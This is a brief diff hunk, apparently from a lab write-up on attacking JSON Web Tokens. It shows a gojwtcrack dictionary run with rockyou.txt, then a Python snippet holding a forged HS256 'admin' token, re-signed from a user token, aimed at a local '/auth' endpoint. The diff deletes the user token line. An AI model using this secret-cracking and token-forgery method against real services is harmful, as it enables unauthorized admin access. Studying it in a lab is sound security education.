@@ -99,7 +99,6 @@ user@user:~$ go/bin/gojwtcrack -d rockyou.txt -t token.txt
 import requests
 
 url = 'http://192.168.142.128:5001/auth'
-user_token  = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1NzAxNjQ2OCwianRpIjoiNTM0YzYzM2MtMWI1ZC00MDdlLThhYzQtZDk5YjUyYTIwNDkyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InVzZXIiLCJuYmYiOjE2NTcwMTY0NjgsImV4cCI6MTY1NzAxNzM2OH0.EkkKCuMfwvZZItOCZ4jUcJOaQTzbSVtXpXmft9aXYcE'
 
 admin_token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1NzAxNjQ2OCwianRpIjoiNTM0YzYzM2MtMWI1ZC00MDdlLThhYzQtZDk5YjUyYTIwNDkyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNjU3MDE2NDY4LCJleHAiOjE2NTcwMTczNjh9.JDFj3EvsSaz8YXfCUeiGxL4X74QdPbi-w2M4XVG04Fo'
 
